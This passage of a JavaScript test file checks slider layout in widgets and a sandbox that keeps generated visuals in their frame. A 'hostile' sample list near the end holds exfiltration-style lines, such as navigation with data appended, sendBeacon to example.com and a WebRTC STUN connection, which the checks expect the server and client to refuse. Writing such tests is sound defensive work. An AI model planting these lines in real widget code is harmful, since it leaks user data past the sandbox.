    check('… the values share one width, start right after their tracks, in tabular figures', d.getElementById('bv').style.minWidth === '36px' && d.getElementById('av').style.fontVariantNumeric === 'tabular-nums' && d.getElementById('av').style.textAlign === 'start' && d.getElementById('bv').style.textAlign === 'start', d.getElementById('bv').style.minWidth);
    check('… and each slider takes the rest of its row', d.getElementById('a').style.flexGrow === '1' && l1.style.flexShrink === '0');
    d.getElementById('bv').textContent = '10 N/m';
    d.getElementById('b').dispatchEvent(new w.Event('input', { bubbles: true }));
    await new Promise((r) => setTimeout(r, 80));
    check('a value that grows as its slider moves widens the whole column', d.getElementById('av').style.minWidth === '54px', d.getElementById('av').style.minWidth);
    d.getElementById('bv').textContent = '1';
    d.getElementById('b').dispatchEvent(new w.Event('input', { bubbles: true }));
    await new Promise((r) => setTimeout(r, 80));
    check('… and does not shrink back when it gets short again', d.getElementById('av').style.minWidth === '54px', d.getElementById('av').style.minWidth);
    const css = d.getElementById('__w-sliders')?.textContent || '';
    check('native sliders take the accent, at no specificity, with a mouse too', /:where\([^)]*input\[type=range\][^)]*\)\{accent-color:var\(--w-accent\)/.test(css), css);
}
{
    const w = await sliders(`<p><label>Mass</label> <input type="range"> <span>3</span></p><p><label>Spring const</label> <input type="range"> <span>5</span></p>`);
    const [l1] = w.document.querySelectorAll('label');
    check('inline rows (no flex) line up too', l1.style.minWidth === '108px' && l1.style.display === 'inline-block', `${l1.style.minWidth} ${l1.style.display}`);
}
{
    const w = await sliders(`<div class="row" style="display:flex"><label>Mass</label><input id="a" type="range"><span>3</span></div>`);
    check('one slider row alone is left as the build made it', !w.document.querySelector('label').style.minWidth && !w.document.getElementById('a').style.flexGrow);
}
{
    const w = await sliders(`<style>.g{display:grid;grid-template-columns:max-content 1fr max-content}.c{display:flex;flex-direction:column}</style>
<div class="g"><label>Mass</label><input type="range"><span>3</span></div><div class="g"><label>Spring const</label><input type="range"><span>5</span></div>
<section><div class="c"><label>Mass</label><input type="range"><span>3</span></div><div class="c"><label>Spring const</label><input type="range"><span>5</span></div></section>`);
    check('a grid row and a column flex (label above) are left alone', [...w.document.querySelectorAll('label')].every((l) => !l.style.minWidth));
}
{
    const w = await sliders(`<style>.row{display:flex}</style>
<div class="row"><button>-</button><input type="range"><button>+</button><span>3</span></div><div class="row"><button>-</button><input type="range"><button>+</button><span>5</span></div>
<div><div class="row"><label>${'A very long label for a slider'}</label><input type="range"></div><div class="row"><label>B</label><input type="range"></div></div>`);
    check('a row with more than label, slider, value, or labels past 45% of the row, is left alone', [...w.document.querySelectorAll('label,button')].every((l) => !l.style.minWidth));
}
{
    const w = await sliders(`<style>.row{display:flex}</style><div class="row"><label>Mass</label><input type="range"><span>3</span></div>
<div class="row" hidden id="late"><label>Spring const</label><input type="range"><span>5</span></div>`);
    const d = w.document;
    d.getElementById('late').hidden = false;
    await new Promise((r) => setTimeout(r, 80));
    check('a row the build shows later is lined up once it shows', d.querySelector('label').style.minWidth === '108px', d.querySelector('label').style.minWidth);
}
{
    const drawn = '<style>input.custom{-webkit-appearance:none;appearance:none;height:6px;background:#ccc}</style>';
    const mixed = await sliders(`${drawn}<input id="n" type="range"><input id="c" class="custom" type="range">`);
    const c = mixed.document.getElementById('c'), n = mixed.document.getElementById('n');
    const css = mixed.document.getElementById('__w-sliders').textContent;
    check('a widget mixing a drawn slider with native ones draws it native too', c.hasAttribute('data-w-native') && !n.hasAttribute('data-w-native')
        && /input\[data-w-native\]::-webkit-slider-thumb[^{]*\{-webkit-appearance:auto!important/.test(css),
        c.getAttribute('style'));
    // A build that repaints its track from script on every input (a gradient
    // fill written into style.background) must not undo it: the reset is a
    // stylesheet rule with !important, which an inline style does not beat.
    check('… by a stylesheet rule an inline style the build writes later cannot beat', /input\[data-w-native\]\{[^}]*appearance:auto!important[^}]*background:transparent!important[^}]*height:auto!important/.test(css)
        && !c.getAttribute('style'), css.slice(0, 200));
    const all = await sliders(`${drawn}<input class="custom" type="range"><input class="custom" type="range">`);
    check('… one whose sliders are ALL drawn keeps them', [...all.document.querySelectorAll('input')].every((r) => !r.getAttribute('style') && !r.hasAttribute('data-w-native')));
    const overlay = await sliders(`${drawn}<input id="n" type="range"><div><input id="o" class="custom" type="range" style="opacity:0"></div>`);
    check('… and an invisible slider laid over a drawn track is not turned into a visible one', !overlay.document.getElementById('o').hasAttribute('data-w-native'));
}
{
    const w = await sliders(`<style>.row{display:flex}</style>
<div class="row"><label data-pad="16">Mass</label><input id="a" type="range"><span data-pad="16">3</span></div>
<div class="row"><label data-pad="16">Spring</label><input id="b" type="range"><span data-pad="16">5</span></div>`);
    const d = w.document, l = d.querySelector('label'), first = l.style.minWidth;
    for (let i = 0; i < 3; i++) {
        d.getElementById('a').dispatchEvent(new w.Event('input', { bubbles: true }));
        await new Promise((r) => setTimeout(r, 80));
    }
    check('a padded label keeps its width pass after pass (the min-width is border-box)', first === '70px' && l.style.minWidth === '70px' && l.style.boxSizing === 'border-box', `${first} → ${l.style.minWidth}`);
}
{
    const w = await sliders(`<style>.row{display:flex}</style>
<div class="row"><label>Mass</label><input id="a" type="range"><span id="av" style="min-width:5px">3</span></div>
<div class="row"><label>Spring const</label><input id="b" type="range"><span id="bv">5</span></div>`);
    const d = w.document, l = d.querySelector('label'), av = d.getElementById('av');
    const aligned = l.style.minWidth === '108px' && av.style.minWidth === '9px';
    d.getElementById('bv').textContent = '1234567890 kg';
    d.getElementById('b').dispatchEvent(new w.Event('input', { bubbles: true }));
    await new Promise((r) => setTimeout(r, 80));
    check('a column that stops leaving room for a track is given back as the build made it', aligned && !l.style.minWidth && !d.getElementById('a').style.flexGrow && !av.style.textAlign, `${aligned} ${l.style.minWidth}`);
    check('… including an inline value the build wrote itself (min-width:5px), not just blanked', av.style.minWidth === '5px', av.style.minWidth);
    const wide = await sliders(`<style>.row{display:flex}</style>
<div class="row"><label>Mass</label><input type="range"><span>1234567890 kg</span></div>
<div class="row"><label>Spring const</label><input type="range"><span>5</span></div>`);
    check('… and one that never left room is not lined up at all', [...wide.document.querySelectorAll('label')].every((x) => !x.style.minWidth));
}
{
    const w = await sliders(`<style>.row{display:flex}</style>
<div class="row"><button>-</button><input type="range"><button>+</button></div><div class="row"><button>−</button><input type="range"><button>+</button></div>`);
    check('a − slider + stepper is not read as label and value', [...w.document.querySelectorAll('button')].every((b) => !b.getAttribute('style')));
}
{
    const w = await sliders(`<style>.row{display:flex}.col{flex-direction:column}</style>
<section id="s1"><div class="row" id="c1"><label>Mass</label><input type="range"><span>3</span></div>
<div class="row"><label>Spring const</label><input type="range"><span>5</span></div></section>
<section><div class="row" id="gone"><label>Mass</label><input type="range"><span>3</span></div>
<div class="row"><label>Spring const</label><input type="range"><span>5</span></div>
<div class="row"><label>Damping</label><input type="range"><span>1</span></div></section>`);
    const d = w.document, c1 = d.querySelectorAll('#s1 label'), gone = d.querySelector('#gone label');
    const before = [...c1].every((x) => x.style.minWidth === '108px') && gone.style.minWidth === '108px';
    d.getElementById('c1').classList.add('col');
    d.getElementById('gone').remove();
    await new Promise((r) => setTimeout(r, 80));
    check('a row that turns into a column takes its column with it: both rows given back', before && [...c1].every((x) => !x.style.minWidth && !x.style.boxSizing), [...c1].map((x) => x.style.minWidth).join(' '));
    check('… and a row taken out of the page is given back before it can be put in again', !gone.style.minWidth && !gone.style.flexShrink, gone.style.minWidth);
}
{
    const w = await sliders(`<style>.row{display:flex}</style><p id="other">readout</p>
<div class="row" id="r1"><label>Mass</label><input type="range"><span>3</span></div>
<div class="row"><label>Spring const</label><input type="range"><span>5</span></div>`);
    const d = w.document, l = d.querySelector('label');
    l.style.minWidth = '';
    d.getElementById('other').className = 'lit';
    d.getElementById('other').appendChild(d.createElement('b'));
    await new Promise((r) => setTimeout(r, 80));
    const untouched = !l.style.minWidth;
    d.getElementById('r1').className = 'row open';
    await new Promise((r) => setTimeout(r, 80));
    check('a class change or a new element away from every slider runs no pass; one on a slider row does', untouched && l.style.minWidth === '108px', `${untouched} ${l.style.minWidth}`);
}

// ---------------------------------------------------------------------------
// A visual does not leave its frame. Three layers, each asserted here; what
// they add up to in a real browser is measured by temp/frame-leak/walk.py,
// counting at a local listener: a navigation (Edge, Firefox, WebKit) and a
// STUN packet (Edge; Firefox headless sent none even unsandboxed, Playwright's
// WebKit has no WebRTC), because jsdom has neither navigation nor WebRTC.
console.log('\nleaving the frame');
{
    // 1. The app's own enforced policy governs where its frames may go.
    const appSrc = readFileSync(join(root, 'server/app.js'), 'utf8');
    const enforced = appSrc.slice(appSrc.indexOf('const CSP_ENFORCED = ['), appSrc.indexOf("].join('; ');", appSrc.indexOf('const CSP_ENFORCED = [')));
    check('the ENFORCED header limits frames to this app: frame-src \'self\' blob:', enforced.includes(`"frame-src 'self' blob:"`), enforced);
    // The page itself talks only to its own server (every outbound request is
    // the server's), and runs workers only from its own files.
    check('the ENFORCED header limits fetches and workers to this app: connect-src \'self\', worker-src \'self\' blob:',
        enforced.includes(`"connect-src 'self'"`) && enforced.includes(`"worker-src 'self' blob:"`), enforced);
    // Steps toward an enforced script-src: a chart is evaluated by vega's
    // interpreter instead of compiled with new Function, and the page has no
    // inline script (the theme boot is a file).
    const vegaSrc = readFileSync(join(root, 'src/components/visuals/renderVega.ts'), 'utf8');
    check('a chart is drawn by the expression interpreter (vega-embed ast: true), never compiled', /\bast:\s*true\b/.test(vegaSrc));
    const html = readFileSync(join(root, 'index.html'), 'utf8');
    const inline = [...html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)].filter(([, attrs, body]) => !/\bsrc=/.test(attrs) && body.trim());
    check('index.html has no inline script for script-src to allow', inline.length === 0, inline.map((m) => m[0].slice(0, 60)).join(' | '));

    // 2. The first script takes WebRTC away, and nothing after it gets it back;
    // nor can the code start a nested document, which would hold fresh copies.
    const box = new JSDOM('<!doctype html><html><head></head><body></body></html>', { runScripts: 'outside-only', beforeParse(win) {
        win.RTCPeerConnection = function RTCPeerConnection() {};
        win.webkitRTCPeerConnection = function () {};
        win.RTCDataChannel = function () {};
    } }).window;
    box.eval(LOCKDOWN);
    box.eval(`try { window.RTCPeerConnection = function () {}; } catch (e) {}
        try { delete window.RTCPeerConnection; } catch (e) {}
        try { Object.defineProperty(window, 'RTCPeerConnection', { value: function () {} }); } catch (e) {}
        try { webkitRTCPeerConnection = function () {}; } catch (e) {}`);
    check('after the lockdown no peer connection can be made, put back or redefined',
        box.eval('typeof RTCPeerConnection === "undefined" && typeof webkitRTCPeerConnection === "undefined" && typeof RTCDataChannel === "undefined"'));
    // The code first breaks what the sweep would call, then writes its frames.
    box.eval(`Element.prototype.remove = function () {}; Element.prototype.querySelectorAll = function () { return []; };
        Object.defineProperty(NodeList.prototype, 'length', { get() { return 0; } });
        var f = document.createElement('iframe'); f.srcdoc = '<p>x</p>'; document.body.appendChild(f);
        var d = document.createElement('div'); d.innerHTML = '<span><iframe srcdoc="x"></iframe><object></object><embed></span>'; document.body.appendChild(d);`);
    await new Promise(r => setTimeout(r, 0));
    check('a frame the code writes, alone or inside markup, is gone before it loads — whatever it did to the DOM methods first',
        box.document.body.innerHTML.search(/<(?:iframe|object|embed)\b/i) === -1, box.document.body.innerHTML.slice(0, 200));
    const shut = (code) => { try { box.eval(code); return false; } catch { return true; } };
    check('…and the ways around the sweep are shut: a shadow root, document.write/open',
        shut(`document.body.attachShadow({ mode: 'open' })`) && shut(`document.write('<iframe srcdoc=x></iframe>')`) && shut(`document.open()`));
    box.eval(`try { Element.prototype.attachShadow = HTMLElement.prototype.click; } catch (e) {}
        try { Object.defineProperty(document, 'write', { value: function () {} }); } catch (e) {}`);
    check('…and stay shut', shut(`document.body.attachShadow({ mode: 'open' })`) && shut(`document.write('x')`));
    const p5Src = readFileSync(join(root, 'src/components/visuals/renderP5.ts'), 'utf8');
    check('a p5 sketch\'s document runs the same lockdown first, right after its CSP',
        /\$\{sketchCsp\(\)\}\r?\n<script>\$\{SANDBOX_LOCKDOWN_JS\}<\\\/script>/.test(p5Src));
    check('…and a sketch that names a way out is refused before it is probed',
        p5Src.indexOf('leavesTheFrame(sketch)') !== -1 && p5Src.indexOf('leavesTheFrame(sketch)') < p5Src.indexOf('await probeSketch('));

    // 3. Code that names a way out goes back to be fixed: the client's check
    // (p5) and the server's (widget builds) refuse the same things, from ONE
    // list (server/leavingFrame.js).
    const aiSrc = readFileSync(aiPath, 'utf8');
    check('the server\'s widget vetoes are that list, not a copy of it',
        /\.\.\.LEAVING_FRAME,/.test(aiSrc) && /import \{ LEAVING_FRAME \} from '\.\/leavingFrame\.js';/.test(aiSrc)
        && /export \{ leavesTheFrame \} from '\.\.\/\.\.\/\.\.\/server\/leavingFrame\.js';/.test(readFileSync(join(root, 'src/components/visuals/sandboxLockdown.ts'), 'utf8')));
    const scratchDb = mkdtempSync(join(cache, 'widget-csp-ai-'));
    process.env.DB_PATH = join(scratchDb, 'gate.db');
    process.env.VAULT_ROOT = join(scratchDb, 'vault');
    const { finalizeWidgetHtml } = await import(pathToFileURL(aiPath).href);
    // The header as served, not only as written (scratch library, set above).
    const { createApp } = await import(pathToFileURL(join(root, 'server/app.js')).href);
    const srv = createApp().listen(0, '127.0.0.1');
    await new Promise(r => srv.once('listening', r));
    const served = await new Promise((ok, no) => get({ host: '127.0.0.1', port: srv.address().port, path: '/api/build', agent: false },
        r => { r.resume(); ok(String(r.headers['content-security-policy'] || '')); }).on('error', no));
    await new Promise(r => srv.close(r));
    check('…and the app SENDS it', served.split(';').map(s => s.trim()).includes("frame-src 'self' blob:"), served);
    const asBuild = (js) => `<!doctype html><html><head></head><body><div id="w">x</div><script>${js}</script></body></html>`;
    const serverRefuses = (js) => { try { finalizeWidgetHtml(asBuild(js)); return false; } catch { return true; } };
    const hostile = [
        "location.href = 'https://example.com/?d=' + data;",
        "window.location = 'https://example.com/';",
        "document.location.assign('https://example.com/');",
        "setTimeout(function () { location.replace('https://example.com/'); }, 300);",
        "top.location = 'https://example.com/';",
        "var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:example.com' }] });",
        "new webkitRTCPeerConnection({});",
        "navigator.sendBeacon('https://example.com/', data);",
        "window.open('https://example.com/');",
        "location = 'https://example.com/?d=' + data;",
        "var f = document.createElement('iframe'); f.srcdoc = page;",
        "var f = createElement('iframe');",
        "host.attachShadow({ mode: 'open' }).innerHTML = markup;",
    ];
    const benign = [
        "var location = { x: 3, y: 4 }; draw(location.x);",
        "el.style.top = '4px'; rect.top.toFixed(1);",
        "function open(panel) { panel.hidden = false; } open(menu);",
        "dialog.open = true; parent.postMessage({ type: 'size' }, '*');",
        "var relocation = 1; body.location = 2;",
        "const location = 'Paris'; let a = location == 'Paris';",
        "var p = createElement('p'); var c = createElement('canvas');",
    ];
    const markupOnly = [
        '<iframe srcdoc="x"></iframe>', '<IFRAME src="about:blank">', '<object data="x"></object>', '<embed src="x">',
        '<meta http-equiv="refresh" content="0;url=https://example.com/">',
    ];
    for (const m of markupOnly) {
        check(`a widget build carrying ${m.slice(0, 40)} is refused`, (() => { try { finalizeWidgetHtml(asBuild('1;').replace('<body>', `<body>${m}`)); return false; } catch { return true; } })());
    }
    for (const js of hostile) {
        check(`refused on both sides: ${js.slice(0, 60)}`, !!leavesTheFrame(js) && serverRefuses(js), `client ${leavesTheFrame(js)}, server ${serverRefuses(js)}`);
    }
    for (const js of benign) {
        check(`kept on both sides: ${js.slice(0, 60)}`, !leavesTheFrame(js) && !serverRefuses(js), `client ${leavesTheFrame(js)}, server ${serverRefuses(js)}`);
    }
    try { rmSync(scratchDb, { recursive: true, force: true }); } catch { /* the library is still open; node_modules/.cache is scratch */ }
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
